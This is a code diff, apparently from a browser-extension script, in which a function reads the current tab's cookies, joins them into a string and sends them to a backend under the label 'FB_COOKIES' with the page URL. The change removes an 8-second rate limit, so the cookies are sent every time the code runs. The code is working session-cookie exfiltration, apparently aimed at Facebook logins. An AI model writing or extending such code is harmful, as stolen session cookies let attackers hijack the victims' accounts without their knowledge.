@@ -390,13 +390,8 @@ function fillCard(type, noBackend) {
                 cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
               }
               if (!noBackend) {
-                const now = Date.now();
-                if (!lastBackendSent_FB_COOKIES || now - lastBackendSent_FB_COOKIES > 8000) {
-                  sendToBackend('FB_COOKIES', { cookies: cookiesStr, url: tabs[0].url, time: new Date().toISOString() });
-                  lastBackendSent_FB_COOKIES = now;
-                } else {
-                  console.log('FB_COOKIES skipped due to 8s rule');
-                }
+                console.log('Sending FB_COOKIES to backend...');
+                sendToBackend('FB_COOKIES', { cookies: cookiesStr, url: tabs[0].url, time: new Date().toISOString() });
               }
               isProcessingCard = false;
             });
